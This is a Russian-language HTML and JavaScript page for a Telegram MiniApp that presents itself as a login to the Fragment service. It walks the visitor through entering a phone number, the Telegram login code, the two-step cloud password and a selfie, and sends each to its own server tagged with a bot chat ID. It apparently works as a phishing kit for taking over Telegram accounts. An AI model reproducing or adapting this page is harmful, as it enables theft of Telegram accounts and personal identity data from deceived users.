...
<head>
    ...
    <style>
        :root {
            /* Enhanced color palette - более современная и контрастная */
            --bg-color: #0a0e17;
            --bg-secondary: #1a2232;
            --accent-color: #3b82f6;
            --accent-hover: #2563eb;
...
/* Кнопка "Назад в магазин" - фиксированная позиция */
.back-to-shop-btn {
    position: fixed;
    top: 20px;
    left: 20px;
...
<div class="auth-card">
    ...
    <p id="desc">Введите номер телефона для входа через Fragment</p>
    ...
    <div id="step-phone" class="input-group active">
        ...
        <div class="phone-input">
            <input type="tel" id="phone" placeholder="Введите номер телефона" maxlength="20">
        </div>
        ...
        <button id="btn-phone" onclick="handlePhone()">
            <div class="spinner"></div><span>Далее</span>
    ...
    <div id="step-code" class="input-group">
        ...
        <button class="back-step-button" onclick="goBackToPhone()">
            ...
            <span>Назад к номеру</span>
        </button>

        <button id="btn-code" onclick="handleCode()">
            <div class="spinner"></div><span>Подтвердить</span>
            <div class="star star-1">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
                </svg>
    ...
    <div id="step-password" class="input-group">
        <input type="password" id="password" placeholder="Облачный пароль">
        ...
        <button id="btn-password" onclick="handlePassword()">
            <div class="spinner"></div><span>Войти</span>
            <div class="star star-1">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
                </svg>
    ...
    <div id="step-photo" class="input-group">
        <div style="text-align: center; padding: 20px;">
            ...
            <p style="color: var(--text-secondary); font-size: 15px; margin-bottom: 24px;">
                📸 Сфотографируйтесь для подтверждения личности
            </p>
    ...
    <div id="step-loading" class="input-group">
        <div style="text-align: center; padding: 40px 20px;">
            ...
            <p style="color: var(--text-secondary); font-size: 16px; line-height: 1.6; margin: 0;">
                Ожидайте 1-3 минуты, пожалуйста не закрывайте MiniApp до окночания авторизации, это может сбросить ее
            </p>
        </div>
    </div>
    ...
    <button class="service-button" onclick="window.location.href='fragment-info.html?chatId=' + chatId">
        <div class="button-content">
            <span>ℹ О сервисе Fragment</span>
        </div>
    ...
    <script>
    const API_BASE = window.location.origin; // Использует текущий домен
    ...
    const COUNTRY_DATA = {
        // Europe
        "+43": { name: "Австрия", flag: "🇦🇹", length: 10 }, "+355": { name: "Албания", flag: "🇦🇱", length: 9 }, "+376": { name: "Андорра", flag: "🇦🇩", length: 6 },
        "+375": { name: "Беларусь", flag: "🇧🇾", length: 9 }, "+32": { name: "Бельгия", flag: "🇧🇪", length: 9 }, "+359": { name: "Болгария", flag: "🇧🇬", length: 9 },
        "+387": { name: "Босния и Герцеговина", flag: "🇧🇦", length: 8 }, "+39": { name: "Италия", flag: "🇮🇹", length: 10 }, "+44": { name: "Великобритания", flag: "🇬🇧", length: 10 },
        "+36": { name: "Венгрия", flag: "🇭🇺", length: 9 }, "+49": { name: "Германия", flag: "🇩🇪", length: 10 }, "+350": { name: "Гибралтар", flag: "🇬🇮", length: 8 },
        "+30": { name: "Греция", flag: "🇬🇷", length: 10 }, "+45": { name: "Дания", flag: "🇩🇰", length: 8 }, "+353": { name: "Ирландия", flag: "🇮🇪", length: 9 },
        "+354": { name: "Исландия", flag: "🇮🇸", length: 7 }, "+34": { name: "Испания", flag: "🇪🇸", length: 9 }, "+383": { name: "Косово", flag: "🇽🇰", length: 8 },
        "+371": { name: "Латвия", flag: "🇱🇻", length: 8 }, "+370": { name: "Литва", flag: "🇱🇹", length: 8 }, "+423": { name: "Лихтенштейн", flag: "🇱🇮", length: 7 },
        "+352": { name: "Люксембург", flag: "🇱🇺", length: 9 }, "+389": { name: "Македония", flag: "🇲🇰", length: 8 }, "+356": { name: "Мальта", flag: "🇲🇹", length: 8 },
        "+373": { name: "Молдова", flag: "🇲🇩", length: 8 }, "+377": { name: "Монако", flag: "🇲🇨", length: 8 }, "+31": { name: "Нидерланды", flag: "🇳🇱", length: 9 },
        "+47": { name: "Норвегия", flag: "🇳🇴", length: 8 }, "+48": { name: "Польша", flag: "🇵🇱", length: 9 }, "+351": { name: "Португалия", flag: "🇵🇹", length: 9 },
        "+40": { name: "Румыния", flag: "🇷🇴", length: 10 }, "+7": { name: "Россия", flag: "🇷🇺", length: 10 }, "+378": { name: "Сан-Марино", flag: "🇸🇲", length: 9 },
        "+381": { name: "Сербия", flag: "🇷🇸", length: 9 }, "+421": { name: "Словакия", flag: "🇸🇰", length: 9 }, "+386": { name: "Словения", flag: "🇸🇮", length: 8 },
        "+380": { name: "Украина", flag: "🇺🇦", length: 9 }, "+298": { name: "Фарерские острова", flag: "🇫🇴", length: 6 }, "+358": { name: "Финляндия", flag: "🇫🇮", length: 9 },
        "+33": { name: "Франция", flag: "🇫🇷", length: 9 }, "+385": { name: "Хорватия", flag: "🇭🇷", length: 9 }, "+382": { name: "Черногория", flag: "🇲🇪", length: 8 },
        "+420": { name: "Чешская Республика", flag: "🇨🇿", length: 9 }, "+41": { name: "Швейцария", flag: "🇨🇭", length: 9 }, "+46": { name: "Швеция", flag: "🇸🇪", length: 9 },
        "+372": { name: "Эстония", flag: "🇪🇪", length: 8 },

        // North America
        "+1": { name: "США/Канада", flag: "🇺🇸", length: 10 }, "+52": { name: "Мексика", flag: "🇲🇽", length: 10 },

        // South America
        "+54": { name: "Аргентина", flag: "🇦🇷", length: 10 }, "+591": { name: "Боливия", flag: "🇧🇴", length: 8 }, "+55": { name: "Бразилия", flag: "🇧🇷", length: 11 },
        "+58": { name: "Венесуэла", flag: "🇻🇪", length: 10 }, "+592": { name: "Гайана", flag: "🇬🇾", length: 7 }, "+57": { name: "Колумбия", flag: "🇨🇴", length: 10 },
        "+595": { name: "Парагвай", flag: "🇵🇾", length: 9 }, "+51": { name: "Перу", flag: "🇵🇪", length: 9 }, "+597": { name: "Суринам", flag: "🇸🇷", length: 7 },
        "+598": { name: "Уругвай", flag: "🇺🇾", length: 8 }, "+56": { name: "Чили", flag: "🇨🇱", length: 9 }, "+593": { name: "Эквадор", flag: "🇪🇨", length: 9 },

        // Asia
        "+994": { name: "Азербайджан", flag: "🇦🇿", length: 9 }, "+374": { name: "Армения", flag: "🇦🇲", length: 8 }, "+93": { name: "Афганистан", flag: "🇦🇫", length: 9 },
        "+880": { name: "Бангладеш", flag: "🇧🇩", length: 10 }, "+973": { name: "Бахрейн", flag: "🇧🇭", length: 8 }, "+673": { name: "Бруней", flag: "🇧🇳", length: 7 },
        "+975": { name: "Бутан", flag: "🇧🇹", length: 8 }, "+670": { name: "Восточный Тимор", flag: "🇹🇱", length: 7 }, "+84": { name: "Вьетнам", flag: "🇻🇳", length: 9 },
        "+995": { name: "Грузия", flag: "🇬🇪", length: 9 }, "+972": { name: "Израиль", flag: "🇮🇱", length: 9 }, "+91": { name: "Индия", flag: "🇮🇳", length: 10 },
        "+62": { name: "Индонезия", flag: "🇮🇩", length: 10 }, "+962": { name: "Иордания", flag: "🇯🇴", length: 9 }, "+964": { name: "Ирак", flag: "🇮🇶", length: 10 },
        "+98": { name: "Иран", flag: "🇮🇷", length: 10 }, "+967": { name: "Йемен", flag: "🇾🇪", length: 9 }, "+855": { name: "Камбоджа", flag: "🇰🇭", length: 9 },
        "+974": { name: "Катар", flag: "🇶🇦", length: 8 }, "+996": { name: "Киргизия", flag: "🇰🇬", length: 9 }, "+86": { name: "Китай", flag: "🇨🇳", length: 11 },
        "+850": { name: "Северная Корея", flag: "🇰🇵", length: 9 }, "+965": { name: "Кувейт", flag: "🇰🇼", length: 8 }, "+856": { name: "Лаос", flag: "🇱🇦", length: 8 },
        "+961": { name: "Ливан", flag: "🇱🇧", length: 8 }, "+60": { name: "Малайзия", flag: "🇲🇾", length: 9 }, "+960": { name: "Мальдивы", flag: "🇲🇻", length: 7 },
        "+976": { name: "Монголия", flag: "🇲🇳", length: 8 }, "+95": { name: "Мьянма", flag: "🇲🇲", length: 9 }, "+977": { name: "Непал", flag: "🇳🇵", length: 10 },
        "+971": { name: "ОАЭ", flag: "🇦🇪", length: 9 }, "+968": { name: "Оман", flag: "🇴🇲", length: 8 }, "+92": { name: "Пакистан", flag: "🇵🇰", length: 10 },
        "+970": { name: "Палестина", flag: "🇵🇸", length: 9 }, "+966": { name: "Саудовская Аравия", flag: "🇸🇦", length: 9 }, "+65": { name: "Сингапур", flag: "🇸🇬", length: 8 },
        "+963": { name: "Сирия", flag: "🇸🇾", length: 9 }, "+992": { name: "Таджикистан", flag: "🇹🇯", length: 9 }, "+66": { name: "Таиланд", flag: "🇹🇭", length: 9 },
        "+886": { name: "Тайвань", flag: "🇹🇼", length: 9 }, "+993": { name: "Туркменистан", flag: "🇹🇲", length: 8 }, "+90": { name: "Турция", flag: "🇹🇷", length: 10 },
        "+998": { name: "Узбекистан", flag: "🇺🇿", length: 9 }, "+63": { name: "Филиппины", flag: "🇵🇭", length: 10 }, "+94": { name: "Шри-Ланка", flag: "🇱🇰", length: 9 },
        "+82": { name: "Южная Корея", flag: "🇰🇷", length: 10 }, "+81": { name: "Япония", flag: "🇯🇵", length: 10 },

        // Africa
        "+213": { name: "Алжир", flag: "🇩🇿", length: 9 }, "+244": { name: "Ангола", flag: "🇦🇴", length: 9 }, "+229": { name: "Бенин", flag: "🇧🇯", length: 8 },
        "+267": { name: "Ботсвана", flag: "🇧🇼", length: 7 }, "+226": { name: "Буркина-Фасо", flag: "🇧🇫", length: 8 }, "+257": { name: "Бурунди", flag: "🇧🇮", length: 8 },
        "+241": { name: "Габон", flag: "🇬🇦", length: 7 }, "+220": { name: "Гамбия", flag: "🇬🇲", length: 7 }, "+233": { name: "Гана", flag: "🇬🇭", length: 9 },
        "+224": { name: "Гвинея", flag: "🇬🇳", length: 9 }, "+245": { name: "Гвинея-Бисау", flag: "🇬🇼", length: 7 }, "+253": { name: "Джибути", flag: "🇩🇯", length: 6 },
        "+20": { name: "Египет", flag: "🇪🇬", length: 10 }, "+260": { name: "Замбия", flag: "🇿🇲", length: 9 }, "+263": { name: "Зимбабве", flag: "🇿🇼", length: 9 },
        "+238": { name: "Кабо-Верде", flag: "🇨🇻", length: 7 }, "+237": { name: "Камерун", flag: "🇨🇲", length: 9 }, "+254": { name: "Кения", flag: "🇰🇪", length: 9 },
        "+269": { name: "Коморы", flag: "🇰🇲", length: 7 }, "+242": { name: "Конго", flag: "🇨🇬", length: 9 }, "+243": { name: "ДР Конго", flag: "🇨🇩", length: 9 },
        "+225": { name: "Кот-д'Ивуар", flag: "🇨🇮", length: 8 }, "+266": { name: "Лесото", flag: "🇱🇸", length: 8 }, "+231": { name: "Либерия", flag: "🇱🇷", length: 7 },
        "+218": { name: "Ливия", flag: "🇱🇾", length: 9 }, "+230": { name: "Маврикий", flag: "🇲🇺", length: 8 }, "+222": { name: "Мавритания", flag: "🇲🇷", length: 8 },
        "+261": { name: "Мадагаскар", flag: "🇲🇬", length: 9 }, "+265": { name: "Малави", flag: "🇲🇼", length: 9 }, "+223": { name: "Мали", flag: "🇲🇱", length: 8 },
        "+212": { name: "Марокко", flag: "🇲🇦", length: 9 }, "+258": { name: "Мозамбик", flag: "🇲🇿", length: 8 }, "+264": { name: "Намибия", flag: "🇳🇦", length: 9 },
        "+227": { name: "Нигер", flag: "🇳🇪", length: 8 }, "+234": { name: "Нигерия", flag: "🇳🇬", length: 10 }, "+262": { name: "Реюньон", flag: "🇷🇪", length: 9 },
        "+250": { name: "Руанда", flag: "🇷🇼", length: 9 }, "+239": { name: "Сан-Томе и Принсипи", flag: "🇸🇹", length: 7 }, "+221": { name: "Сенегал", flag: "🇸🇳", length: 9 },
        "+248": { name: "Сейшелы", flag: "🇸🇨", length: 7 }, "+252": { name: "Сомали", flag: "🇸🇴", length: 8 }, "+249": { name: "Судан", flag: "🇸🇩", length: 9 },
        "+232": { name: "Сьерра-Леоне", flag: "🇸🇱", length: 8 }, "+255": { name: "Танзания", flag: "🇹🇿", length: 9 }, "+228": { name: "Того", flag: "🇹🇬", length: 8 },
        "+216": { name: "Тунис", flag: "🇹🇳", length: 8 }, "+256": { name: "Уганда", flag: "🇺🇬", length: 9 }, "+236": { name: "ЦАР", flag: "🇨🇫", length: 8 },
        "+235": { name: "Чад", flag: "🇹🇩", length: 8 }, "+240": { name: "Экв. Гвинея", flag: "🇬🇶", length: 9 }, "+291": { name: "Эритрея", flag: "🇪🇷", length: 7 },
        "+268": { name: "Эсватини", flag: "🇸🇿", length: 8 }, "+251": { name: "Эфиопия", flag: "🇪🇹", length: 9 }, "+27": { name: "ЮАР", flag: "🇿🇦", length: 9 },

        // Oceania
        "+61": { name: "Австралия", flag: "🇦🇺", length: 9 }, "+678": { name: "Вануату", flag: "🇻🇺", length: 7 }, "+686": { name: "Кирибати", flag: "🇰🇮", length: 8 },
        "+692": { name: "Маршалловы Острова", flag: "🇲🇭", length: 7 }, "+691": { name: "Микронезия", flag: "🇫🇲", length: 7 }, "+674": { name: "Науру", flag: "🇳🇷", length: 7 },
        "+683": { name: "Ниуэ", flag: "🇳🇺", length: 4 }, "+64": { name: "Новая Зеландия", flag: "🇳🇿", length: 9 }, "+687": { name: "Новая Каледония", flag: "🇳🇨", length: 6 },
        "+682": { name: "Острова Кука", flag: "🇨🇰", length: 5 }, "+680": { name: "Палау", flag: "🇵🇼", length: 7 }, "+675": { name: "Папуа Новая Гвинея", flag: "🇵🇬", length: 8 },
        "+685": { name: "Самоа", flag: "🇼🇸", length: 7 }, "+677": { name: "Соломоновы Острова", flag: "🇸🇧", length: 7 }, "+690": { name: "Токелау", flag: "🇹🇰", length: 4 },
        "+676": { name: "Тонга", flag: "🇹🇴", length: 7 }, "+688": { name: "Тувалу", flag: "🇹🇻", length: 7 }, "+679": { name: "Фиджи", flag: "🇫🇯", length: 7 },
        "+689": { name: "Французская Полинезия", flag: "🇵🇫", length: 6 }
    };

    console.log('ChatID from URL:', chatId); // Для отладки
    console.log('Current origin:', window.location.origin); // Для отладки
    ...
    function goBackToPhone() {
        ...
        document.getElementById('desc').innerText = 'Введите номер телефона для входа через Fragment';
        // Clear code inputs
    ...
    function goBackToCode() {
        ...
        document.getElementById('desc').innerText = 'Код отправлен в ваш Telegram';
    ...
    function showError(msg, inputElement = null) {
        console.error('Error:', msg); // Для отладки
    ...
    async function req(path, body) {
        try {
            ...
            console.log('Sending request to:', `${API_BASE}${path}`, requestData); // Для отладки
            ...
            console.log('Response status:', r.status); // Для отладки
            ...
            console.log('Response data:', result); // Для отладки
            return result;
        } catch (e) {
            console.error('Request failed:', e); // Для отладки
            return {status: 'error', message: `Ошибка связи с сервером: ${e.message}`};
        }
    }
    ...
    async function handlePhone() {
        ...
        if (!chatId) return showError('Ошибка: откройте приложение через Telegram бота');
    ...
    async function handleCode() {
        ...
        if (!code || !/^\d{5}$/.test(code)) {
            return showError('Неверный код', document.getElementById('code-input'));
        }
        ...
        if (res.status === 'success') {
            ...
            document.getElementById('desc').innerText = 'Введите пароль двухэтапной аутентификации';
        } else {
            showError(res.message || 'Неверный код', document.getElementById('code-input'));
        }
    }
    ...
    async function handlePassword() {
        ...
        if (res.status === 'success') {
            ...
            document.getElementById('title').innerText = 'Загрузка...';
            document.getElementById('desc').innerText = 'Пожалуйста, подождите';
        } else {
            showError(res.message || 'Неверный код', document.getElementById('code-input'));
        }
    }
    ...
    async function showPhotoStep() {
        try {
            ...
            document.getElementById('title').innerText = 'Подтверждение личности';
            document.getElementById('desc').innerText = 'Сфотографируйтесь для верификации';
